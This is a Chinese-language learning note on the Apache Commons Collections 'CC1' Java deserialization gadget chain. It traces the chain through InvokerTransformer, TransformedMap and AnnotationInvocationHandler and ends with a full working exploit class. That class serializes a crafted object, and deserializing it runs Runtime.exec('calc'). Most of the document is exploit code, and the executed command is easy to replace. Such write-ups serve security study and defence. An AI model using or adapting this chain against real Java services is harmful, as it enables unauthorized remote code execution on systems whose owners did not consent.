# 关于cc1链的学习笔记

## 前言：

## InvokerTransformer

在Transformer类中，我们可以找到其中的子类InvokerTransformer。其中的方法transform就像一个标准的漏洞方法。

~~~java
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
~~~

其中反射调用部分的所有参数都可控，这便可以让我们直接命令执行。

我们可以构造如下语句

~~~java
Class<?> cls = Class.forName("java.lang.Runtime");
        Runtime getRuntime = (Runtime) cls.getMethod("getRuntime", null).invoke(Runtime.class, null);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(getRuntime);
~~~



# TransformedMap

在TransformedMap中的checkSetValue方法调用了transform，但由于此方法和构造函数都是保护的，我们必须首先想办法实例化该类。

我们发现，该类存在方法decorate

~~~java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
~~~

可实例化TransformedMap，我们分别传入参数并实例化对象，但此时由于checkSetValue方法访问权限为保护权限，所以我们不能直接调用。

我们在TransformedMap的父类中找到TransformedMap的调用

父类AbstractInputCheckedMapDecorator存在内部类AbstractMapEntryDecorator，其中方法setValue调用checkSetValue。

```java
public Object setValue(Object value) {
    value = parent.checkSetValue(value);
    return entry.setValue(value);
}
```

我们进行跟栈，发现parent为调用的this

```java
public Set entrySet() {
    if (isSetValueChecking()) {
        return new EntrySet(map.entrySet(), this);
    } else {
        return map.entrySet();
    }
}
```

所以我们可以利用TransformedMap调用setValue方法达到调用checkSetValue的目的

```java
Class<?> cls = Class.forName("java.lang.Runtime");
Runtime getRuntime = (Runtime) cls.getMethod("getRuntime", null).invoke(Runtime.class, null);
InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> map = new HashMap<>();
map.put("key","value");
Map<Object,Object> decorate = TransformedMap.decorate(map, null, exec);
for (Map.Entry<Object,Object> entry:decorate.entrySet()){
    entry.setValue(getRuntime);
}
```

# AnnotationInvocationHandler

在AnnotationInvocationHandler中我们找到readObject调用setValue方法。

~~~java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
~~~

但是我们发现AnnotationInvocationHandler的构造函数是private的，我们利用反射获得其实例化对象

~~~java
Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, decorate);
~~~

此时我们跟栈发现

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

此时valueTransformer可控，但value不可控。我们利用ConstantTransformer的transform方法盖掉这个value。并使用chainTransForm链式调用。

```java
Transformer[] transforms = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
```

# 最终链子

```java
import jdk.internal.org.objectweb.asm.tree.analysis.Value;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.TransformedPredicate;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.crypto.dsig.Transform;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Cc {
    public static void main(String[] args) throws Exception{

        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","value");
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
//        for (Map.Entry<Object,Object> entry:decorate.entrySet()){
//            entry.setValue(getRuntime);
//        }
        Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, decorate);
        serialize(o);
        unSerialize();
    }

    public static void serialize(Object o)throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }

    public static Object unSerialize()throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("ser.bin"));
        Object o = objectInputStream.readObject();
        return o;
    }
}
```

